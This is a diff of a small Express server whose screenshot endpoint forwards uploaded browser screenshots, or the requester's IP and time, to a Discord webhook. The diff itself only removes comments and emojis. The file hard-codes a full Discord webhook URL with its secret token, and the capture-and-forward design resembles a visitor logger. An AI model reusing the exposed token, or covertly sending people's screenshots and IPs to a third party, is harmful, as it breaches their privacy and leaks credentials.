@@ -8,20 +8,15 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = 3000;
 
-// Discord webhook URL
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413280766208512111/O9G7lYVuX7oieCK9XisBl1EEf74lRxYjL83RRLnlKtnyRAgly42jKEmKElAINhHTPCdj';
 
-// Serve static files
 app.use(express.static('.'));
 
-// Screenshot endpoint
 app.post('/screenshot', async (req, res) => {
     try {
         console.log('Screenshot request received');
         
-        // Check if it's a browser screenshot (FormData) or fallback
         if (req.headers['content-type'] && req.headers['content-type'].includes('multipart/form-data')) {
-            // Browser screenshot - handle the uploaded file
             const multer = require('multer');
             const upload = multer({ storage: multer.memoryStorage() });
             
@@ -36,7 +31,6 @@ app.post('/screenshot', async (req, res) => {
                 }
                 
                 try {
-                    // Send to Discord webhook
                     const form = new FormData();
                     form.append('content', `📸 Browser screenshot captured!`);
                     form.append('file', req.file.buffer, {
@@ -50,10 +44,10 @@ app.post('/screenshot', async (req, res) => {
                     });
                     
                     if (webhookResponse.ok) {
-                        console.log('✅ Browser screenshot sent to Discord successfully');
+                        console.log('Browser screenshot sent to Discord successfully');
                         res.json({ success: true, message: 'Screenshot sent to Discord!' });
                     } else {
-                        console.error('❌ Failed to send browser screenshot to Discord:', webhookResponse.status);
+                        console.error('Failed to send browser screenshot to Discord:', webhookResponse.status);
                         res.status(500).json({ error: 'Failed to send screenshot to Discord' });
                     }
                 } catch (webhookError) {
@@ -62,10 +56,9 @@ app.post('/screenshot', async (req, res) => {
                 }
             });
         } else {
-            // Fallback - just send a message to Discord
             try {
                 const form = new FormData();
-                form.append('content', `📸 Screenshot request from: ${req.ip || 'Unknown'}\nTime: ${new Date().toISOString()}`);
+                form.append('content', `Screenshot request from: ${req.ip || 'Unknown'}\nTime: ${new Date().toISOString()}`);
                 
                 const webhookResponse = await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -73,10 +66,10 @@ app.post('/screenshot', async (req, res) => {
                 });
                 
                 if (webhookResponse.ok) {
-                    console.log('✅ Screenshot request logged to Discord');
+                    console.log('Screenshot request logged to Discord');
                     res.json({ success: true, message: 'Request logged!' });
                 } else {
-                    console.error('❌ Failed to log request to Discord:', webhookResponse.status);
+                    console.error('Failed to log request to Discord:', webhookResponse.status);
                     res.status(500).json({ error: 'Failed to log request' });
                 }
             } catch (webhookError) {
@@ -91,19 +84,17 @@ app.post('/screenshot', async (req, res) => {
     }
 });
 
-// Health check endpoint
 app.get('/health', (req, res) => {
     res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
-// Start server
 app.listen(PORT, () => {
-    console.log(`🎮 Screenshot app running at http://localhost:${PORT}`);
-    console.log(`📸 Click the link to take a screenshot!`);
+    console.log(`Screenshot app running at http://localhost:${PORT}`);
+    console.log(`Click the link to take a screenshot!`);
 });
 
-// Graceful shutdown
 process.on('SIGINT', () => {
-    console.log('\n👋 Shutting down screenshot app...');
+    console.log('\nShutting down screenshot app...');
     process.exit(0);
 });
+
